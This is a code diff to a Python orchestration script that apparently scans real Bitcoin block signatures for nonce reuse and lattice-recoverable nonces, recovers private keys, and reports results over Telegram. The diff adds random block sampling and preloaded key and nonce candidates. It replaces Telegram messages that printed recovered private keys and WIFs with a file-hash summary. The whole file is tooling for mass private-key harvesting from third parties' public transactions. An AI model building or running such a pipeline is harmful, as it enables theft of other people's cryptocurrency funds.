@@ -109,16 +109,16 @@ def apply_live_backoff(args: argparse.Namespace, sample: dict[str, float]) -> tu
         eff_threads = max(1, min(eff_threads, max(1, cpu // 3)))
         eff_max_clusters = max(15, min(eff_max_clusters, 50))
         eff_max_iter = 1
-        eff_random_k = min(eff_random_k, 1024) if max_discovery else 0
-        eff_cluster_min_sigs = max(eff_cluster_min_sigs, 30)
-        eff_cluster_risk = max(eff_cluster_risk, 20)
+        eff_random_k = min(eff_random_k, 2048) if max_discovery else 0
+        eff_cluster_min_sigs = max(eff_cluster_min_sigs, 24 if max_discovery else 30)
+        eff_cluster_risk = max(eff_cluster_risk, 18 if max_discovery else 20)
     elif level == 3:
         eff_threads = max(1, min(eff_threads, max(1, cpu // 4)))
         eff_max_clusters = max(10, min(eff_max_clusters, 30))
         eff_max_iter = 1
-        eff_random_k = min(eff_random_k, 256) if max_discovery else 0
-        eff_cluster_min_sigs = max(eff_cluster_min_sigs, 40)
-        eff_cluster_risk = max(eff_cluster_risk, 25)
+        eff_random_k = min(eff_random_k, 1024) if max_discovery else 0
+        eff_cluster_min_sigs = max(eff_cluster_min_sigs, 28 if max_discovery else 40)
+        eff_cluster_risk = max(eff_cluster_risk, 22 if max_discovery else 25)
 
     effective = {
         "threads": eff_threads,
@@ -206,7 +206,10 @@ def resolve_python_explicit_or_default(python_arg: str) -> str:
     4) current interpreter
     """
     if python_arg and python_arg != sys.executable:
-        return python_arg
+        p = Path(python_arg)
+        if p.exists() and os.access(p, os.X_OK):
+            return python_arg
+        print(f"[warn] requested python is not executable: {python_arg}; falling back to local venv/current interpreter")
     for candidate in ("venv/bin/python", ".venv/bin/python"):
         p = Path(candidate)
         if p.exists() and os.access(p, os.X_OK):
@@ -426,6 +429,7 @@ def build_cycle_artifact_paths(run_dir: Path, cycle: int, cycle_start: int, args
         "recover_deltas": cycle_dir / "delta_insights.jsonl",
         "recover_collisions": cycle_dir / "r_collisions.jsonl",
         "recover_clusters": cycle_dir / "dupR_clusters.jsonl",
+        "candidate_validation_report": cycle_dir / "candidate_validation_report.json",
         "clustered_sigs": cycle_dir / "signatures.clustered.jsonl",
         "cluster_report": cycle_dir / "cluster_risk_report.json",
         "hnp_candidates": cycle_dir / "hnp_lll_bkz_candidates.txt",
@@ -444,26 +448,23 @@ def tail_nonempty_lines(path: Path, limit: int) -> list[str]:
     return lines[-limit:]
 
 
-def format_recovered_rows_for_telegram(path: Path, limit: int = 3) -> list[str]:
-    rows = tail_nonempty_lines(path, limit)
-    if not rows:
-        return []
-    formatted: list[str] = []
-    for raw in rows:
-        try:
-            obj = json.loads(raw)
-        except Exception:
-            formatted.append(raw)
-            continue
-        pub = obj.get("pubkey") or obj.get("pub") or "n/a"
-        priv = obj.get("priv_hex") or obj.get("priv") or obj.get("private_key") or "n/a"
-        wif = obj.get("wif") or "n/a"
-        r_val = obj.get("r") or "n/a"
-        method = obj.get("method") or "n/a"
-        formatted.append(
-            f"pub={pub}\npriv_hex={priv}\nwif={wif}\nr={r_val}\nmethod={method}"
-        )
-    return formatted
+def file_sha256(path: Path) -> str:
+    if not path.exists():
+        return "missing"
+    h = hashlib.sha256()
+    with path.open("rb") as f:
+        for chunk in iter(lambda: f.read(1024 * 1024), b""):
+            h.update(chunk)
+    return h.hexdigest()
+
+
+def recovered_artifact_summary(path: Path, new_rows: int) -> str:
+    return (
+        f"artifact={path}\n"
+        f"artifact_sha256={file_sha256(path)}\n"
+        f"new_rows={new_rows}\n"
+        "priv_material=LOCAL_ARTIFACT_ONLY"
+    )
 
 
 def main() -> None:
@@ -472,6 +473,14 @@ def main() -> None:
     ap.add_argument("--batch-size", type=int, default=100, help="Blocks per cycle")
     ap.add_argument("--max-cycles", type=int, default=0,
                     help="0 = run forever, otherwise stop after this many cycles")
+    ap.add_argument("--download-mode", choices=("deterministic", "random"), default="deterministic",
+                    help="Block traversal mode for download_signatures.py")
+    ap.add_argument("--random-seed", type=int, default=0,
+                    help="PRNG seed passed to download_signatures.py when --download-mode=random")
+    ap.add_argument("--random-min-height", type=int, default=5000,
+                    help="Lower bound passed to download_signatures.py when --download-mode=random")
+    ap.add_argument("--random-max-height", type=int, default=450000,
+                    help="Upper bound passed to download_signatures.py when --download-mode=random")
 
     ap.add_argument("--threads", type=int, default=8)
     ap.add_argument("--risk-threshold", type=int, default=40)
@@ -502,6 +511,10 @@ def main() -> None:
     ap.add_argument("--recovered", default="recovered_keys.jsonl")
     ap.add_argument("--audit-report", default="ecdsa_audit_report.json")
     ap.add_argument("--decision-report", default="automate_decision.json")
+    ap.add_argument("--preload-k-candidates", default="",
+                    help="Local r->k candidate JSONL passed through to automate_recover.py")
+    ap.add_argument("--preload-priv-candidates", default="",
+                    help="Local WIF/hex/decimal candidate file passed through to automate_recover.py")
     ap.add_argument("--timeline-log", default="reports/timeline.jsonl",
                     help="Append-only timeline log for per-cycle events")
     ap.add_argument("--reports-dir", default="reports",
@@ -615,10 +628,18 @@ def main() -> None:
         download_cmd = [
             args.python,
             "download_signatures.py",
-            "--mode", "deterministic",
+            "--mode", args.download_mode,
             "--start-height", str(cycle_start),
             "--max-blocks", str(args.batch_size),
         ]
+        if args.download_mode == "deterministic":
+            download_cmd += ["--end-height", "900000"]
+        else:
+            download_cmd += [
+                "--random-seed", str(args.random_seed + cycle),
+                "--random-min-height", str(args.random_min_height),
+                "--random-max-height", str(args.random_max_height),
+            ]
         rc = run_cmd(download_cmd)
         if rc != 0:
             raise RuntimeError(f"download_signatures.py failed with exit code {rc}")
@@ -653,6 +674,7 @@ def main() -> None:
             "--recover-collisions-out", str(cycle_artifacts["recover_collisions"]),
             "--recover-clusters-out", str(cycle_artifacts["recover_clusters"]),
             "--hnp-candidates-out", str(cycle_artifacts["hnp_candidates"]),
+            "--candidate-validation-report", str(cycle_artifacts["candidate_validation_report"]),
             "--stage0-subset-out", str(cycle_artifacts["stage0_subset"]),
             "--strong-signal-out", str(cycle_artifacts["strong_signal"]),
             "--fallback-max-iter", str(max(4 if args.discovery_mode == "max" else 3, effective["max_iter"])),
@@ -660,6 +682,10 @@ def main() -> None:
         ]
         if args.discovery_mode == "max":
             recover_cmd.append("--full-scan-fallback")
+        if args.preload_k_candidates:
+            recover_cmd += ["--preload-k-candidates", args.preload_k_candidates]
+        if args.preload_priv_candidates:
+            recover_cmd += ["--preload-priv-candidates", args.preload_priv_candidates]
         if args.auto_tune:
             recover_cmd.append("--auto-tune")
         else:
@@ -698,6 +724,7 @@ def main() -> None:
                     anomaly_fingerprint_value = anomaly_fingerprint(d)
                     vq = d.get("verification_quality", {}) or {}
                     stage0 = d.get("stage0_subset", {}) or {}
+                    external_candidates = d.get("external_candidate_validation", {}) or {}
                     stage_runs = d.get("recover_stages", []) or []
                     stage_names = ",".join(str(s.get("name", "?")) for s in stage_runs) if stage_runs else "none"
                     invalid_ratio = vq.get("invalid_ratio")
@@ -719,12 +746,17 @@ def main() -> None:
                         f"invalid={vq.get('invalid')}\n"
                         f"invalid_ratio={invalid_ratio_str}\n"
                         f"recover_executed={d.get('recover_executed')}\n"
+                        f"recovery_viability={d.get('recovery_viability')}\n"
+                        f"key_recovered={d.get('key_recovered')}\n"
+                        f"new_local_recovered_rows={d.get('new_local_recovered_rows')}\n"
+                        f"known_nonce_rows={d.get('known_nonce_rows')}\n"
+                        f"external_candidates={external_candidates.get('enabled')}\n"
                         f"recover_input={d.get('recover_input')}\n"
                         f"recover_stages={stage_names}\n"
                         f"cluster_gating_used={d.get('cluster_gating_used')}\n"
                         f"stage0_selected={stage0.get('selected_signatures')}\n"
                         f"stage0_nontrivial_groups={stage0.get('nontrivial_duplicate_r_groups')}\n"
-                        f"hnp_candidates={hnp_candidate_count}\n"
+                        f"hnp_candidates={d.get('hnp_candidate_rows', hnp_candidate_count)}\n"
                     )
             except Exception as e:
                 print(f"[warn] failed to parse decision report: {e}")
@@ -756,18 +788,15 @@ def main() -> None:
 
         if new_rows > 0:
             if bot_token and telegram_chat_id:
-                key_lines = format_recovered_rows_for_telegram(cycle_artifacts["recovered_json"], min(new_rows, 3))
-                key_block = "\n\n".join(key_lines) if key_lines else "n/a"
+                artifact_summary = recovered_artifact_summary(cycle_artifacts["recovered_json"], new_rows)
                 msg = (
                     "Recovered new rows.\n"
                     f"run_id={run_id}\n"
                     f"cycle={cycle}\n"
                     f"start_height={cycle_start}\n"
                     f"batch_size={args.batch_size}\n"
-                    f"new_rows={new_rows}\n"
                     f"total_rows={after_recovered}\n"
-                    "latest_recovered_rows:\n"
-                    f"{key_block}"
+                    f"{artifact_summary}"
                 )
                 ok = send_telegram_message(bot_token, telegram_chat_id, msg)
                 print(f"Telegram alert sent={ok} chat_id={telegram_chat_id}")
